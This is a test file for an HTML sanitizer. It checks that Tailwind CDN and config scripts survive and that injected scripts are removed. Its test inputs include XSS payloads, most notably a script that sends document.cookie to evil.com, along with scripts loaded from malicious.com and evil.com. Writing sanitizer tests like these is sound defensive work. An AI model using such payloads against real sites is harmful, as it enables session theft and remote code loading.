import { sanitizeHtml } from './html.ts';

describe('sanitizeHtml', () => {
  it('should allow Tailwind CDN script', () => {
    const html =
      '<div>Content</div><script src="https://cdn.tailwindcss.com"></script>';
    const result = sanitizeHtml(html);

    expect(result).toContain(
      '<script src="https://cdn.tailwindcss.com"></script>'
    );
    expect(result).toContain('<div>Content</div>');
  });

  it('should allow tailwind.config inline script', () => {
    const tailwindConfig = `
          <div>Content</div>
          <script>
            tailwind.config = {
              theme: {
                extend: {
                  colors: {
                    'custom-blue': '#1e40af'
                  }
                }
              }
            }
          </script>
        `;
    const result = sanitizeHtml(tailwindConfig);

    expect(result).toContain('<script>');
    expect(result).toContain('tailwind.config');
    expect(result).toContain('custom-blue');
    expect(result).toContain('<div>Content</div>');
  });

  it('should allow both Tailwind CDN and config scripts together', () => {
    const html = `
          <div>Content</div>
          <script src="https://cdn.tailwindcss.com"></script>
          <script>
            tailwind.config = {
              theme: {
                extend: {
                  colors: {
                    'brand-blue': '#1e40af'
                  }
                }
              }
            }
          </script>
        `;
    const result = sanitizeHtml(html);

    expect(result).toContain(
      '<script src="https://cdn.tailwindcss.com"></script>'
    );
    expect(result).toContain('tailwind.config');
    expect(result).toContain('brand-blue');
    expect(result).toContain('<div>Content</div>');
  });
});

it('should remove inline script with alert', () => {
  const html = '<div>Hello</div><script>alert("hack")</script><p>World</p>';
  const result = sanitizeHtml(html);

  expect(result).not.toContain('<script>');
  expect(result).not.toContain('alert("hack")');
  expect(result).toContain('<div>Hello</div>');
  expect(result).toContain('<p>World</p>');
});

it('should remove script with document.cookie access', () => {
  const html =
    '<div>Content</div><script>document.cookie = "stolen=true"</script>';
  const result = sanitizeHtml(html);

  expect(result).not.toContain('<script>');
  expect(result).not.toContain('document.cookie');
  expect(result).toContain('<div>Content</div>');
});

it('should remove script with XSS payload', () => {
  const html =
    '<p>Normal content</p><script>window.location="http://evil.com?cookie="+document.cookie</script>';
  const result = sanitizeHtml(html);

  expect(result).not.toContain('<script>');
  expect(result).not.toContain('evil.com');
  expect(result).not.toContain('window.location');
  expect(result).toContain('<p>Normal content</p>');
});

it('should remove external script from untrusted domain', () => {
  const html =
    '<div>Content</div><script src="https://malicious.com/script.js"></script>';
  const result = sanitizeHtml(html);

  expect(result).not.toContain('<script');
  expect(result).not.toContain('malicious.com');
  expect(result).toContain('<div>Content</div>');
});

it('should remove multiple malicious scripts', () => {
  const html = `
        <div>Safe content</div>
        <script>alert("first hack")</script>
        <p>More content</p>
        <script src="https://evil.com/hack.js"></script>
        <script>document.write("XSS")</script>
      `;
  const result = sanitizeHtml(html);

  expect(result).not.toContain('<script');
  expect(result).not.toContain('alert');
  expect(result).not.toContain('evil.com');
  expect(result).not.toContain('document.write');
  expect(result).toContain('<div>Safe content</div>');
  expect(result).toContain('<p>More content</p>');
});
